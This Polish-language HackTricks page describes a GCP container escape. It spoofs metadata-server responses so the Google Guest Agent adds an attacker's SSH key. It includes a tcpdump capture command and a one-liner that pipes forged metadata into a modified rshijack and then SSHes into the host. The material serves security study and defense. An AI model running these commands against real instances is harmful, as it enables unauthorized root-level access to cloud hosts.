# GCP - Network Docker Escape

{{#include ../../../banners/hacktricks-training.md}}

## Stan początkowy

W obu opisach, w których ta technika została użyta, atakującym udało się uzyskać dostęp **root** wewnątrz kontenera **Docker** zarządzanego przez GCP z dostępem do sieci hosta (oraz z uprawnieniami **`CAP_NET_ADMIN`** i **`CAP_NET_RAW`**).

## Wyjaśnienie ataku

Na instancji Google Compute Engine regularna inspekcja ruchu sieciowego ujawnia liczne **zwykłe żądania HTTP** do **instancji metadanych** pod adresem `169.254.169.254`. [**Google Guest Agent**](https://github.com/GoogleCloudPlatform/guest-agent), usługa open-source, często wykonuje takie żądania.

Agent zaprojektowano do **monitorowania zmian w metadanych**. Warto zauważyć, że metadane zawierają **pole na publiczne klucze SSH**. Gdy nowy publiczny klucz SSH zostanie dodany do metadanych, agent automatycznie go **autoryzuje** w pliku `.authorized_key`. Może również **utworzyć nowego użytkownika** i dodać go do **sudoers**, jeśli to konieczne.

Agent monitoruje zmiany wysyłając żądanie w celu **pobrania wszystkich wartości metadanych rekurencyjnie** (`GET /computeMetadata/v1/?recursive=true`). To żądanie ma na celu skłonienie serwera metadanych do wysłania odpowiedzi tylko wtedy, gdy od ostatniego pobrania zaszła jakaś zmiana w metadanych, identyfikowana przez Etag (`wait_for_change=true&last_etag=`). Dodatkowo uwzględniany jest parametr **timeout** (`timeout_sec=`). Jeśli w określonym czasie nie nastąpi żadna zmiana, serwer odpowiada **niezmienionymi wartościami**.

Ten proces pozwala **IMDS** (Instance Metadata Service) odpowiedzieć po **60 sekundach**, jeśli nie nastąpiła żadna zmiana konfiguracji, tworząc potencjalne **okienko do wstrzyknięcia fałszywej odpowiedzi konfiguracyjnej** do guest agenta.

Atakujący mógłby to wykorzystać, przeprowadzając **Man-in-the-Middle (MitM) attack**, podszywając się pod odpowiedź serwera IMDS i **wstawiając nowy klucz publiczny**. Mogłoby to umożliwić nieautoryzowany dostęp SSH do hosta.

### Technika ucieczki

Chociaż ARP spoofing jest nieskuteczny w sieciach Google Compute Engine, [**zmodyfikowana wersja rshijack**](https://github.com/ezequielpereira/rshijack) opracowana przez [**Ezequiel**](https://www.ezequiel.tech/2020/08/dropping-shell-in.html) może być użyta do wstrzyknięcia pakietów w komunikacji w celu wstawienia użytkownika SSH.

Ta wersja rshijack pozwala podać liczby ACK i SEQ jako argumenty w linii poleceń, ułatwiając podszycie się pod odpowiedź przed rzeczywistą odpowiedzią serwera Metadata. Dodatkowo używany jest [**mały skrypt Shell**](https://gist.github.com/ezequielpereira/914c2aae463409e785071213b059f96c#file-fakedata-sh) do zwrócenia **specjalnie spreparowanego ładunku**. Ten ładunek powoduje, że Google Guest Agent **tworzy użytkownika `wouter`** z określonym kluczem publicznym w pliku `.authorized_keys`.

Skrypt używa tego samego ETag, aby uniemożliwić serwerowi Metadata natychmiastowe powiadomienie Google Guest Agent o innych wartościach metadanych, opóźniając w ten sposób odpowiedź.

Aby przeprowadzić podszycie, konieczne są następujące kroki:

1. **Monitoruj żądania do serwera Metadata** używając **tcpdump**:

<details>
<summary>Monitoruj żądania do serwera Metadata za pomocą tcpdump</summary>
```bash
tcpdump -S -i eth0 'host 169.254.169.254 and port 80' &
```
</details>

Szukaj linii podobnej do:

<details>
<summary>Przykładowa linia wyjściowa tcpdump</summary>
```
<TIME> IP <LOCAL_IP>.<PORT> > 169.254.169.254.80: Flags [P.], seq <NUM>:<TARGET_ACK>, ack <TARGET_SEQ>, win <NUM>, length <NUM>: HTTP: GET /computeMetadata/v1/?timeout_sec=<SECONDS>&last_etag=<ETAG>&alt=json&recursive=True&wait_for_change=True HTTP/1.1
```
</details>

2. Wyślij fałszywe metadane z poprawnym ETAG do rshijack:

<details>
<summary>Wyślij fałszywe metadane i połącz się przez SSH z hostem</summary>
```bash
fakeData.sh <ETAG> | rshijack -q eth0 169.254.169.254:80 <LOCAL_IP>:<PORT> <TARGET_SEQ> <TARGET_ACK>; ssh -i id_rsa -o StrictHostKeyChecking=no wouter@localhost
```
</details>

Ten krok autoryzuje public key, umożliwiając połączenie SSH przy użyciu odpowiadającego private key.

## Referencje

- [https://www.ezequiel.tech/2020/08/dropping-shell-in.html](https://www.ezequiel.tech/2020/08/dropping-shell-in.html)
- [https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)

{{#include ../../../banners/hacktricks-training.md}}
